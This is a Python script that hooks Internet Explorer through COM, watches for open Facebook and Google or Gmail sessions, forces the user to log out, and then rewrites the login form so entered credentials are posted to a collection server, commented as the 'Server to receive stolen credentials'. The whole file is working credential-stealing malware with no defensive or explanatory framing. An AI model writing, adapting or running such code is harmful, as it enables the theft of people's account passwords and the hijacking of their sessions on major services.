import time
from urllib.parse import urlparse, quote
import win32com.client

# Server to receive stolen credentials
server = "http://localhost:8080/"

# Sites to hijack
target_sites = {
    'www.facebook.com': {
        'logout_url': None,
        'logout_form': 'logout_form',
        'login_form_index': 0,
        'owned': False
    },
    'accounts.google.com': {
        'logout_url': 'https://accounts.google.com/logout',
        'logout_form': None,
        'login_form_index': 0,
        'owned': False
    }
}

# Add Gmail subdomains
target_sites["www.gmail.com"] = target_sites['accounts.google.com']
target_sites["mail.google.com"] = target_sites['accounts.google.com']

# Internet Explorer COM interface
IE_COM_ID = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
windows = win32com.client.Dispatch(IE_COM_ID)


def wait_for_browser(browser):
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)
    return


def hijack_browser():
    while True:
        for browser in windows:
            try:
                url = urlparse(browser.LocationUrl)
                hostname = url.hostname

                if hostname in target_sites:
                    site_info = target_sites[hostname]

                    if site_info['owned']:
                        continue

                    print(f"[+] Hijacking browser session on: {hostname}")

                    # Force logout
                    if site_info['logout_url']:
                        browser.Navigate(site_info['logout_url'])
                        wait_for_browser(browser)
                    else:
                        for elem in browser.Document.all:
                            try:
                                if elem.id == site_info['logout_form']:
                                    elem.submit()
                                    wait_for_browser(browser)
                                    break
                            except Exception:
                                pass

                    # Modify login form to redirect credentials
                    try:
                        login_index = site_info['login_form_index']
                        login_url = quote(browser.LocationUrl)
                        browser.Document.forms[login_index].action = f"{server}{login_url}"
                        site_info['owned'] = True
                        print(f"[+] Form hook injected for {hostname}")
                    except Exception:
                        print(f"[!] Failed to inject form for {hostname}")
                        pass

            except Exception:
                continue

        time.sleep(5)


if __name__ == "__main__":
    hijack_browser()
